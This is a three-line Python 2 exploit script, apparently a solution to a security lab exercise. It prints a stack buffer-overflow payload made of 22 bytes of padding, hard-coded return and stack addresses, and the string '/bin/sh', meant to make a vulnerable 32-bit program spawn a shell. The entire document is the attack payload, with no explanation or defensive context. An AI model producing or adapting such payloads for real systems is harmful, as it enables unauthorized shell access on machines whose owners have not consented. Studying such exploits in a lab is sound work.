from struct import pack
from shellcode import shellcode
print '\x61' * 22  + '\xed\x8e\x04\x08' + '\xd4\x7e\xfe\xbf' + '/bin/sh'
